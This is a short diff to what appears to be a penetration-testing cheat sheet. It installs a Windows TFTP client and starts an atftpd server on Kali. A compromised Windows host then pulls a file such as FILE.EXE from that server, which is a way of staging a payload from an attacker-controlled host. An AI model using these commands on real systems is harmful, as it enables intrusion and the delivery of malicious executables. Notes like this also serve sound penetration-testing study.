@@ -2,7 +2,7 @@
 ### Install TFTP (Windows 7, Windows Vista, Windows Server 2008/2008 R2)
 pkgmgr /iu:"TFTP"
 
-C:\>tftp -i <IP> get <file>
+C:\>tftp -i IPADDRESS get <file>
 	
 Make sure it is set up/running on Kali
 
@@ -10,7 +10,7 @@ mkdir /tftp
 
 atftpd --daemon --port 69 /tftp
 
-cp /<file> /tftp/
+cp /FILE.EXE /tftp/
 
 
 ### Add a local user account
